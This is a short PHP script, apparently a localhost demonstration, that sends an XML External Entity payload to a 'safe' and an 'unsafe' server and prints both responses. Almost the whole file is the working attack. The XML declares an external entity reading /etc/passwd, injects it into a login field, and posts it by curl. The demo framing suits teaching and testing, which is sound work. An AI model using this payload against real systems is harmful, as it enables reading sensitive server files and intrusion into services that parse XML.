<?php
    //XML PAYLOAD TO SEND FOR ATTACKS
    $xml = <<<XML
<!DOCTYPE own [ <!ELEMENT own ANY >
<!ENTITY own SYSTEM "file:///etc/passwd" >]>
<login>
    <user>&own;</user>
    <pass>123</pass>
    <mail>hack.com</mail>
</login>
XML;

    // Sends XML to SAFE SERVER
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0) ;
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1) ;
    curl_setopt($ch, CURLOPT_URL, "http://localhost:7777/safe-server.php");
    curl_setopt($ch, CURLOPT_POST, 1);

    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml );
    $data = curl_exec($ch);

    if (curl_errno($ch)){
        print curl_error($ch);
    }else{
        echo "Response BY Safe Server: <br> ". $data;
    }
    curl_close($ch);


    //Send XML to UNSAFE server
    echo "<br><br><br>";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0) ;
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, "http://localhost:7777/unsafe-server.php");
    curl_setopt($ch, CURLOPT_POST, 1);

    curl_setopt ($ch, CURLOPT_POSTFIELDS, $xml);
    $data = curl_exec($ch);

    if(curl_errno($ch)){
        print curl_error($ch);
    }else{
    echo "Response BY UNSAFE Server: <br> ". $data;
    }
    curl_close($ch);

?>